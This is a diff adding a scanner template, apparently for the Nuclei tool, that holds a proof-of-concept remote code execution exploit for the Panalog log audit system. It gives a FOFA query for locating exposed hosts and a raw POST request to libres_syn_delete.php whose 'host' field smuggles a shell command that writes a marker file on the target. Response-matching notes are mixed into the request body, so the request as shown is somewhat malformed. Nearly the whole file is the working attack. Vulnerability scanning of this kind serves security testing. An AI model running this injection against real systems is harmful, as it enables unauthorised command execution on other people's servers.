@@ -1,0 +1,48 @@
+id: poc-axmi6dgfathvctig
+info:
+  name: Panalog 日志审计系统RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/axmi6dgfathvctig'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: axmi6dgfathvctig
+    fofa: app="Panabit-Panalog"
+http:
+- raw:
+  - 'POST /content-apply/libres_syn_delete.php HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Accept-Encoding: gzip
+
+
+    Connection: close
+
+
+
+
+    token=1&id=2&host=| echo "dudesite" >dudesite.txt
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?yes)(?=.*?OK).*?$
+
+
+    # 上传文件定位
+
+    /content-apply/dudesite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
